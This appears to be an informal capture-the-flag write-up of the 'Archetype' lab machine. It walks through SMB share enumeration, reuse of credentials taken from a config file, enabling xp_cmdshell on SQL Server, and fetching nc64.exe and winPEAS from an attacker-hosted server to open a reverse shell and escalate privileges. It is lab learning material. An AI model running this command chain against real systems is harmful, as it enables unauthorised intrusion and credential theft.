Archtype 


Did nmap as usual to get the open ports - could see so many open ports like ms rpc, mssql and smb client etc  
now will try accessing the smbclient by using : smbclient -N -L {ip address}  -N means no password and -L to list the share 

I can see that only backup and IPC$ shares seems to be allowed public assess, and we get a dtsconfig file while opening “backup” share   it seems  .dtsconfig files is used to hardcode connection strings and passwords for the  sql server so a SSIS package ( Sql Server integration service ) will use it  to run ETLs 
Since this was stored securely we can use the password and username given in the .dtsconfig and use it through impacket to connect to the sql server  
password=[REDACTED];User ID=ARCHETYPE\sql_svc  we can connect using python3 mssqlclient.py ARCHETYPE/sql_svc@{TARGET_IP} -windows-auth,  mssqlclient.py is a python file inside the impacket repo and we add a flag -windows-auth to specify to use windows authentication   now a sql command line will show up and we use SELECT is_srvrolemember('sysadmin'); to check if our role is “sysadmin”  and it returned 1 so that means we are and we have the most high level access so we can use something called xp_cmdshell to run commands on the os   from a cheatsheet we get that this is how we enable xp_cmdshell : EXEC sp_configure 'show advanced options', 1; — priv
RECONFIGURE; — priv
EXEC sp_configure 'xp_cmdshell', 1; — priv
RECONFIGURE; — priv  then EXEC xp_cmdshell 'net user'; to check if its activated

now using this we will download the nc64.exe file we have hosted in a python server so we can run the nc64.exe to open the victims port 

to download we can do : xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget
http://10.10.14.9/nc64.exe -outfile nc64.exe”   wget we request to our python server where we have hosted the nc64.exe file and download it to the path specified which is download   now will connect to our port which we exposed using nc  -lvp {port} 

now we need to elevate our access using winpeas which we add to our python server and download it in victim’s device then run it in powershell - wget http://10.10.14.190/winPEASx64.exe -outfile winPEASx64.exe

when you run the winPeas exe it returns a long output with too much info including vulnerabilities it seems its a enumeration tool   As per walkthrough “As this is a normal user account as well as a service account, it is worth checking for frequently access files
or executed commands. To do that, we will read the PowerShell history file, which is the equivalent of
.bash_history for Linux systems. The file ConsoleHost_history.txt can be located in the directory
C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\” 

There we get the admin password and using :  python3 psexec.py administrator@10.129.95.187  then we get the root flag 
 dont forget : 

winPEAS - for  local enumeration for privilege escalation.

psexec.py - lets you authenticate with high privileges and get shell access (SMB-based).



 
